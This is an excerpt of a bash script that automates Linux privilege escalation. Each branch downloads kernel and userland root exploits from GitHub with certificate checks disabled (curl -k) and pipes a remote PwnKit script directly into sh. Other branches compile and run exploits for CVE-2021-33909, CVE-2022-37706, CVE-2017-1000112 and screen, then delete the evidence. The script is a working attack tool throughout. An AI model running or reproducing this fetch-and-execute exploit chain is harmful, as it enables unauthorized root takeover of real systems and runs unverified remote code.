...
if [ $localroot = 1 ]; then
    ...
    for kernel22 in "${kernel2[@]}"; do
        curl -s -k -O https://raw.githubusercontent.com/JlSakuya/Linux-Privilege-Escalation-Exploits/main/$kernel22
    done
...
if [ $localroot = 2 ]; then
    ...
    for kernel33 in "${kernel3[@]}"; do
        curl -s -k -O https://raw.githubusercontent.com/JlSakuya/Linux-Privilege-Escalation-Exploits/main/$kernel33
    done
    echo "[+] exploit CVE-2021-4034"
    sh -c "$(curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.sh)"
...
if [ $localroot = 3 ]; then
    for kernel44 in "${kernel4[@]}"; do
        curl -s -k -O https://raw.githubusercontent.com/JlSakuya/Linux-Privilege-Escalation-Exploits/main/$kernel44
    done
    delete=$(rm -rf exploit)
...
if [ $localroot = 4 ]; then
    for kernel55 in "${kernel5x[@]}"; do
        curl -s -k -O https://raw.githubusercontent.com/JlSakuya/Linux-Privilege-Escalation-Exploits/main/$kernel55
    done
    delete=$(rm -rf exploit)
...
if [ $localroot = 5 ]; then
    ...
    curl -s -k -O https://raw.githubusercontent.com/XiphosResearch/exploits/master/screen2root/screenroot.sh && bash screenroot.sh
    curl -s -k -O https://raw.githubusercontent.com/Liang2580/CVE-2021-33909/main/exploit.c && gcc exploit.c -o exploit && chmod +x exploit && ./exploit && $delete
    curl -s -k -O https://raw.githubusercontent.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit/main/exploit.sh && bash exploit.sh && rm -rf exploit.sh
    curl -s -k -o pwn.c https://raw.githubusercontent.com/jollheef/lpe/master/CVE-2017-1000112/CVE-2017-1000112.c && gcc pwn.c -o pwn && ./pwn
    curl -s -k -O https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2017-5899/exploit.sh && bash exploit.sh
